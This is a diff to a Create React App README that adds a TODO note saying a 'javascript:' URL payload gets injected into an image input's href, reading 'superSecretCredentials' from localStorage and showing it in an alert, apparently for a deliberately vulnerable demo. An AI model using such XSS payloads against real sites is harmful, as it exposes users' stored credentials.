@@ -1,3 +1,8 @@
+## TODO: Write a proper explanation
+This gets injected into the Image input -> href
+`javascript:alert(localStorage.getItem('superSecretCredentials'))`
+
+
 # Getting Started with Create React App
 
 This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
